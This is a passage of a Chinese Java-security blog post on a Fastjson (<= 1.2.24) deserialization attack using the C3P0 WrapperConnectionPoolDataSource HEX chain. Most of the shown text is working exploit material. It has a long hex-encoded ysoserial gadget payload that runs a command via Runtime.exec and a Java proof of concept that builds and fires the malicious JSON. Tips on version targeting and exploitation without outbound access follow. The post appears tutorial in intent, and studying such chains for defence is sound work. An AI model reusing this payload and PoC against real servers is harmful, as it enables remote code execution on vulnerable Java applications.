6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A457863657074696F6E730700270100A6284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B29560100086974657261746F720100354C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B01000768616E646C65720100414C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07002801003379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F6164010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740100146A6176612F696F2F53657269616C697A61626C65010039636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F5472616E736C6574457863657074696F6E01001F79736F73657269616C2F7061796C6F6164732F7574696C2F476164676574730100083C636C696E69743E0100116A6176612F6C616E672F52756E74696D6507002A01000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B0C002C002D0A002B002E01000463616C6308003001000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0C003200330A002B003401000D537461636B4D61705461626C6501001D79736F73657269616C2F50776E6572343633383535303833303837303001001F4C79736F73657269616C2F50776E657234363338353530383330383730303B002100020003000100040001001A000500060001000700000002000800040001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000002F000E0000000C000100000005000F003800000001001300140002000C0000003F0000000300000001B100000002000D00000006000100000034000E00000020000300000001000F0038000000000001001500160001000000010017001800020019000000040001001A00010013001B0002000C000000490000000400000001B100000002000D00000006000100000038000E0000002A000400000001000F003800000000000100150016000100000001001C001D000200000001001E001F00030019000000040001001A00080029000B0001000C00000024000300020000000FA70003014CB8002F1231B6003557B1000000010036000000030001030002002000000002002100110000000A000100020023001000097571007E0018000001D4CAFEBABE00000032001B0A0003001507001707001807001901001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C75650571E669EE3C6D47180100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010003466F6F01000C496E6E6572436C61737365730100254C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F3B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07001A01002379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F0100106A6176612F6C616E672F4F626A6563740100146A6176612F696F2F53657269616C697A61626C6501001F79736F73657269616C2F7061796C6F6164732F7574696C2F47616467657473002100020003000100040001001A000500060001000700000002000800010001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000003C000E0000000C000100000005000F001200000002001300000002001400110000000A000100020016001000097074000450776E727077010078737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B02000078700000000178;&quot;;</span><br><span class="line"></span><br><span class="line">        // 构造完整的PoC</span><br><span class="line">        String poc = &quot;&#123;&quot; +</span><br><span class="line">                &quot;\&quot;e\&quot;:&#123;&quot; +</span><br><span class="line">                &quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot; +</span><br><span class="line">                &quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot; +</span><br><span class="line">                &quot;&#125;,&quot; +</span><br><span class="line">                &quot;\&quot;f\&quot;:&#123;&quot; +</span><br><span class="line">                &quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot; +</span><br><span class="line">                &quot;\&quot;userOverridesAsString\&quot;:\&quot;&quot; + hexPayload + &quot;\&quot;&quot; +</span><br><span class="line">                &quot;&#125;&quot; +</span><br><span class="line">                &quot;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;发送的PoC: &quot; + poc);</span><br><span class="line"></span><br><span class="line">        // 触发漏洞</span><br><span class="line">        try &#123;</span><br><span class="line">            JSON.parseObject(poc);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="⚠️-关键要点与常见问题"><a href="#⚠️-关键要点与常见问题" class="headerlink" title="⚠️ 关键要点与常见问题"></a>⚠️ 关键要点与常见问题</h3><ul>
+<li><strong>成功关键</strong>：HEX载荷必须由<strong>有效的、在目标类路径上的反序列化利用链</strong>（如CC链）生成。如果目标环境中没有相应的Gadget链库，利用将失败。</li>
+<li><strong>版本匹配</strong>：Fastjson 1.2.25及以上版本将 <code>com.mchange</code>包加入了黑名单，因此必须使用 <strong>Fastjson &lt;&#x3D; 1.2.24</strong>。</li>
+<li><strong>载荷格式</strong>：<code>userOverridesAsString</code>的值必须严格以 <code>HexAsciiSerializedMap:</code>开头，以 <code>;</code>结尾。内部的HEX字符串需要是完整的、正确的序列化字节码转换而来。</li>
+<li><strong>不出网利用</strong>：这是此链的核心价值。整个利用过程不需要目标服务器访问外部网络。</li>
+</ul>
+<h3 id="💡-与TemplatesImpl链的对比"><a href="#💡-与TemplatesImpl链的对比" class="headerlink" title="💡 与TemplatesImpl链的对比"></a>💡 与TemplatesImpl链的对比</h3><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>C3P0 HEX链</th>
+<th>TemplatesImpl链</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>出网要求</strong></td>
+<td><strong>不出网</strong></td>
+<td>不出网</td>
+</tr>
+<tr>
+<td><strong>依赖复杂度</strong></td>
+<td>依赖<strong>二次反序列化链</strong>（如CC），环境搭建稍复杂</td>
+<td>仅需JDK中的TemplatesImpl类，依赖简单</td>
+</tr>
+<tr>
+<td><strong>载荷构造</strong></td>
+<td>需借助ysoserial等工具生成Gadget</td>
+<td>直接编译恶意类并编码为BCEL或Base64</td>
+</tr>
+<tr>
+<td><strong>适用场景</strong></td>
+<td>目标环境包含CC等组件时</td>
+<td>目标环境JDK版本合适，且Fastjson配置允许</td>
+</tr>
+</tbody></table>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="子非鱼 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="子非鱼 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/09/26/Java%E6%94%BB%E9%98%B2/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%86/" rel="prev" title="Fastjson反序列化基础认识">
+                  <i class="fa fa-angle-left"></i> Fastjson反序列化基础认识
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">子非鱼</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
